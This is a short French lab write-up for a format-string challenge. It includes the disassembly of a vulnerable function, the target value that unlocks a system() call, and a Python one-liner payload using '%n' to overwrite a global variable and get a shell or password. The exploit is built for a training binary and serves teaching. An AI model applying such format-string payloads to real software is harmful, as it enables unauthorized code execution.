les étapes afin de réussir : Comprendre le binaire donné
disas n
   0x08048458 <+1>:    mov    %esp,%ebp
   0x0804845a <+3>:    sub    $0x218,%esp
   0x08048460 <+9>:    mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>  /// protection overflow
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax    /// 0x8049810 Variable non initialisé
   0x08048492 <+59>:    cmp    $0x1025544,%eax  /// voilà la valeur qu'il faut
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret


   On va chercher à initialisé la variable 0x8049810 afin d'avoir 0x1025544 soit 16930116

  Pour cela on va essayé d'aller jusqu'à notre adresse avec  la première commande
  b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 8049810

  il nous suffit de lancer la deuxieme command pour obtenir le mot de passe
  python -c  'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' > test
                          addr      valeur 16930116 - 4 
